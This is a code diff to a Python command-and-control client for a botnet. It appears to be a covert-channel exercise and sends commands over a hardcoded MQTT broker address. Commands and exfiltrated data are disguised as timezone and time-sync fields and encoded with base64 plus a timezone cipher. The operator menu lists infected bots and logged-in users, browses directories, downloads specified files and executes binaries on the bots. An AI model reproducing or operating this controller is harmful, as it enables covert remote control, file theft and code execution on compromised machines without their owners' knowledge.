@@ -12,9 +12,32 @@ bot_responses = []
 
 #################################### COMMON CODE STARTS HERE ###################################
 
+# MQTT configuration
 MQTT_BROKER = "147.32.82.209"
 MQTT_PORT = 1883
 MQTT_TOPIC = "sensors"
+
+# Message fields
+MSG_FIELD_BOT_ID = "local_time"
+MSG_FIELD_ENCRYPTED_MSG = "leap_seconds"
+MSG_FIELD_TIMEZONES = "timezones"
+
+# Commands
+CMD_LIST_BOTS = 1
+CMD_LIST_USERS = 2
+CMD_LIST_DIR = 3
+CMD_GET_USER_ID = 4
+CMD_DOWNLOAD_FILE = 5
+CMD_EXECUTE_BINARY = 6
+
+COMMAND_TO_TIMEZONE = {
+    CMD_LIST_BOTS: "America/New_York",
+    CMD_LIST_USERS: "America/Los_Angeles",
+    CMD_LIST_DIR: "America/Chicago",
+    CMD_GET_USER_ID: "Europe/London",
+    CMD_DOWNLOAD_FILE: "Europe/Paris",
+    CMD_EXECUTE_BINARY: "Europe/Berlin",
+}
 
 char_to_timezone = {
     "A": "America/Anchorage",
@@ -48,21 +71,6 @@ char_to_timezone = {
 
 timezone_to_char = {v.upper(): k for k, v in char_to_timezone.items()}
 
-action_to_timezone = {
-    0: "UTC",
-    1: "America/New_York",
-    2: "America/Los_Angeles",
-    3: "America/Chicago",
-    4: "Europe/London",
-    5: "Europe/Paris",
-    6: "Europe/Berlin",
-    7: "Europe/Prague",
-    8: "Asia/Tokyo",
-    9: "Asia/Shanghai",
-    10: "Australia/Sydney",
-}
-
-timezone_to_action = {v.upper(): k for k, v in action_to_timezone.items()}
 
 def do_very_strange_encryption(text: str):
     encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
@@ -86,6 +94,7 @@ def do_very_strange_encryption(text: str):
         result[timezone].append(chunk)
     
     return json.dumps(result)
+
 
 def do_very_strange_decryption(encrypted_json: str):
     data = json.loads(encrypted_json)
@@ -127,6 +136,7 @@ def do_very_strange_decryption(encrypted_json: str):
 
 ################################### COMMON CODE ENDS HERE ###################################
 
+
 def on_connect(client, userdata, flags, rc):
     # rc - connection result code. 0 - success, otherwise failure.
     if rc == 0:
@@ -139,6 +149,7 @@ def on_connect(client, userdata, flags, rc):
         client.disconnect()
         exit(1)
 
+
 def on_message(client, userdata, msg):
     try:
         payload = msg.payload.decode()
@@ -150,6 +161,7 @@ def on_message(client, userdata, msg):
     except Exception as ex:
         print(f"Failed to handle message: {ex}")
 
+
 def decode_response(payload: str):
     try:
         data = json.loads(payload)
@@ -157,23 +169,19 @@ def decode_response(payload: str):
         message = ""
         bot_id = ""
 
-        if "local_time" in data:
+        if MSG_FIELD_BOT_ID in data:
             # this field means bot id
-            bot_id = data["local_time"]
+            bot_id = data[MSG_FIELD_BOT_ID]
 
-        if "leap_seconds" in data:
-            # if "leap_seconds" present, it contains encrypted message
-            encrypted_msg = data["leap_seconds"]
+        if MSG_FIELD_ENCRYPTED_MSG in data:
+            # if field present, it contains encrypted message
+            encrypted_msg = data[MSG_FIELD_ENCRYPTED_MSG]
             decrypted_msg = do_very_strange_decryption(encrypted_msg)
             message += f"{decrypted_msg}"
 
-        elif "synced" in data:
-            # if "synced" present, bot is alive
-            message += f"Bot is alive at {datetime.now()}"
-
-        elif "timezones" in data:
-            # if "timezones" present, every timezone in list is mapped to character A-Z
-            for tz in data["timezones"]:
+        elif MSG_FIELD_TIMEZONES in data:
+            # if field present, every timezone in list is mapped to character A-Z
+            for tz in data[MSG_FIELD_TIMEZONES]:
                 message += timezone_to_char[tz.upper()]
 
         result["bot_id"] = bot_id
@@ -181,6 +189,7 @@ def decode_response(payload: str):
         return result
     except json.JSONDecodeError:
         raise Exception("Invalid JSON payload.")
+
 
 def timezone_date_time(timezone: str):
     now_utc = datetime.now(timezone.utc)
@@ -190,29 +199,32 @@ def timezone_date_time(timezone: str):
         # ignore error, return anything
         return now_utc
 
+
 def publish_action_call(client: mqtt.Client, action_number: int, path: str = None):
-    if action_number not in action_to_timezone:
+    if action_number not in COMMAND_TO_TIMEZONE:
         print(f"Timezone is missing for action number {action_number}")
         raise Exception(f"Timezone is missing for action number {action_number}")
 
-    timezone = action_to_timezone[action_number]
+    timezone = COMMAND_TO_TIMEZONE[action_number]
     if timezone is None:
         print(f"Please add more timezones to dictionary: {action_number}")
         return
 
     dt = timezone_date_time(timezone)
     
-    msg = ""
+    msg = {
+        "timezone": timezone,
+        "datetime": dt.isoformat()
+    }
+
     if path is not None:
-        pathEncoded = do_very_strange_encryption(text=path, key=timezone)
-        msg = f'{{"timezone": "{timezone}", "datetime": "{dt.isoformat()}", "leap_seconds": "{pathEncoded}"}}'
-    else:
-        msg = f'{{"timezone": "{timezone}", "datetime": "{dt.isoformat()}"}}'
+        msg[MSG_FIELD_ENCRYPTED_MSG] = do_very_strange_encryption(path)
 
     with response_lock:
         bot_responses.clear()
 
-    client.publish(MQTT_TOPIC, msg)
+    client.publish(MQTT_TOPIC, json.dumps(msg))
+
 
 def wait_for_responses(timeout=5):
     print(f"Waiting {timeout} seconds for bot responses...")
@@ -225,30 +237,42 @@ def wait_for_responses(timeout=5):
 def user_actions(client: mqtt.Client):
     retry = True
     while retry:
-        retry = False
-        print("Actions:")
-        print("\t[1] List alive bots.")
-        print("\t[2] List logged in users.")
-        print("\t[3] List content of specified directory.")
-        print("\t[4] Print ID of user running the bot.")
-        print("\t[5] Download specified file.")
-        print("\t[6] Execute a binary.")
+        try:
+            retry = False
+            print("Actions:")
+            print("\t[1] List alive bots.")
+            print("\t[2] List logged in users.")
+            print("\t[3] List content of specified directory.")
+            print("\t[4] Print ID of user running the bot.")
+            print("\t[5] Download specified file.")
+            print("\t[6] Execute a binary.")
+            print("\t[Q] Quit.")
 
-        action = input("Select action: ").strip()
+            action = input("Select action: ").strip()
 
-        path = None
-        if action in ["3", "5", "6"]:
-            path = input("Enter path: ").strip()
-            if not path:
-                print("Path cannot be empty.")
+            path = None
+            if action in ["3", "5", "6"]:
+                path = input("Enter path: ").strip()
+                if not path:
+                    print("Path cannot be empty.")
+                    retry = True
+                    continue
+
+            if action in ["1", "2", "3", "4", "5", "6"]:
+                publish_action_call(client, int(action), path)
+                wait_for_responses()
+            elif action.upper() == "Q":
+                print("Quitting...")
+                retry = False
+            else:
+                print("Invalid action selected.")
                 retry = True
-                continue
 
-        if action in ["1", "2", "3", "4", "5", "6"]:
-            publish_action_call(client, int(action), path)
-            wait_for_responses()
-        else:
-            print("Invalid action selected.")
+        except KeyboardInterrupt:
+            print("Quitting...")
+            retry = False
+        except Exception as ex:
+            print(f"An error occurred during action selection: {ex}")
             retry = True
 
 def main():
